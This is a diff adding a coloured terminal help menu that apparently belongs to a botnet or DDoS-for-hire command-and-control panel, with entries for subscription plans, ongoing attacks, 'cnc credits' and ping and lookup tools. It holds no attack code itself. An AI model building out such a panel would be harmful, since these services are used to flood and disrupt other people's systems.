@@ -1,0 +1,11 @@
+
+ [97m [38;2;80;178;255m[ Help ]
+
+   [38;2;0;143;255m• [37;1mplan[38;2;0;143;255m: [0m[37;3mshows info about plan
+   [38;2;0;143;255m• [37;1mpasswd[38;2;0;143;255m: [0m[37;3mchanges password for your account
+   [38;2;0;143;255m• [37;1mongoing[38;2;0;143;255m: [0m[37;3mshows ongoing attacks
+   [38;2;0;143;255m• [37;1mclear[38;2;0;143;255m: [0m[37;3mclears terminal
+   [38;2;0;143;255m• [37;1mcredits[38;2;0;143;255m: [0m[37;3mcnc credits
+   [38;2;0;143;255m• [37;1mpaping[38;2;0;143;255m: [0m[37;3mTCP ping another ip
+   [38;2;0;143;255m• [37;1mping[38;2;0;143;255m: [0m[37;3mICMP ping another ip
+   [38;2;0;143;255m• [37;1mlookup[38;2;0;143;255m: [0m[37;3mlookup url/ip
